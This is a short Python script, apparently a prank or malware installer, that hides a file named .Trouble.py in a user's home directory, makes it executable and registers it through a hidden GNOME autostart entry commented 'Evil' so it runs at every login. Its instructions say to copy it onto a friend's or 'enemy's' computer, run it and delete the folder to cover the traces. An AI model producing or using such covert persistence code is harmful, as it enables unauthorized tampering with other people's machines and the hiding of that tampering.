import os
import shutil

f = open ('Troubles.desktop', 'w')
f.write ("[Desktop Entry]\nType=Application\nExec=/home/" + os.getlogin() + "/.Trouble.py\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nName=Trouble\nComment=Evil")
f.close()
shutil.move ('.Trouble.py', '/home/' + os.getlogin() + '/')
os.system ('chmod +x /home/' + os.getlogin() + '/.Trouble.py')
shutil.move('Troubles.desktop', '/home/' + os.getlogin() + '/.config/autostart/')

'''
INSTRUCTIONS :
1. Copy the folder to the home directory of your friend's computer(enemy!).
2. Now run the script TroubleStart.py (The command is : python3 TroubleStart.py)
3. Do not forget to delete this folder after you have run the script.
4. Voila! When your friend reboots her/his computer the next time, she/he will face problems!!!

'''
